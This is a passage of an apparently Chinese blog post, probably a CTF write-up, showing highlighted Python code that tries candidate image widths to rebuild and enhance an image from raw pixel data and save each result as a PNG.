class="keyword">list</span>(<span class="title function_ invoke__">range</span>(<span class="number">115</span>, <span class="number">126</span>)) + <span class="keyword">list</span>(<span class="title function_ invoke__">range</span>(<span class="number">505</span>, <span class="number">516</span>))  <span class="comment"># 细化爆破</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> width in refined_resolutions:</span><br><span class="line">            height = total_pixels <span class="comment">// width</span></span><br><span class="line">            <span class="keyword">if</span> width * height &gt; total_pixels:</span><br><span class="line">                <span class="keyword">print</span>(f<span class="string">&quot;跳过 &#123;width&#125;x&#123;height&#125;，像素数据不足。&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&quot;生成尺寸为 &#123;width&#125;x&#123;height&#125; 的图像...&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 创建原始图像</span></span><br><span class="line">            image = <span class="title function_ invoke__">create_image_from_pixels</span>(pixel_values, width, height)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 微调图像</span></span><br><span class="line">            enhanced_image = <span class="title function_ invoke__">enhance_image</span>(image)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 保存增强后的图像</span></span><br><span class="line">            output_filename = f<span class="string">&quot;output_image_&#123;width&#125;x&#123;height&#125;.png&quot;</span></span><br><span class="line">            enhanced_image.<span class="title function_ invoke__">save</span>(output_filename)</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&quot;增强后的图像已保存为 &#123;output_filename&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;发生错误: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="title function_ invoke__">main</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/">展开全文 >></a>
         </p>
       
 
